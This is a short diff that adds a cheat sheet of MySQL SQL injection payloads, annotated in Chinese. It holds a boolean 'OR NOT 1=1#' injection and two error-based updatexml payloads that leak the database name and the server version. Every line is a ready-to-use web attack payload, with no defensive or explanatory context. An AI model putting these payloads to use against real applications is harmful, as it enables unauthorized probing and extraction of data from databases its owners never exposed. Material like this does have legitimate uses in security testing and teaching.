@@ -1,0 +1,7 @@
+OR NOT 1=1#
+
+
+基于update注入
+payload
+or updatexml(2,concat(0x7e,(database())),0) (or)   #库名
+or updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)  #数据库及其版本信息
